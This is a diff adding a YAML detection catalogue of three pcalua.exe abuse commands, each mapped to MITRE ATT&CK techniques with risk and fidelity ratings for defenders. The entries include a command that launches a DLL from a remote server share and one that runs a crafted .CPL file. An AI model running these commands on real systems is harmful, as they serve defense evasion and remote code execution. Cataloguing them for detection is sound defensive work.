@@ -1,0 +1,60 @@
+- command: pcalua.exe -a calc.exe
+  description: Abuse pcalua.exe to launch a target executable.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
+  risk: High
+  risk_reason: Manual usage of this binary is suspicious.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare for most organizations - monitor for anomalous target locations if volume is high.
+  tool: pcalua
+  threatactors:
+    N/A:
+      - N/A
+- command: pcalua.exe -a \\server\payload.dll
+  description: Abuse pcalua.exe to launch a target DLL from a remote server.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
+  risk: High
+  risk_reason: Manual usage of this binary is suspicious, especially from a remote location.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare for most organizations - monitor for anomalous target locations if volume is high.
+  tool: pcalua
+  threatactors:
+    N/A:
+      - N/A
+- command: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
+  description: Abuse pcalua.exe to launch a crafted .CPL file containing malicious code.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1202
+      - T1218.002
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
+  risk: High
+  risk_reason: Manual usage of this binary is suspicious, especially with .CPL files.
+  fidelity: High
+  fidelity_reason: This type of activity is typically rare for most organizations - monitor for anomalous target locations if volume is high.
+  tool: pcalua
+  threatactors:
+    N/A:
+      - N/A
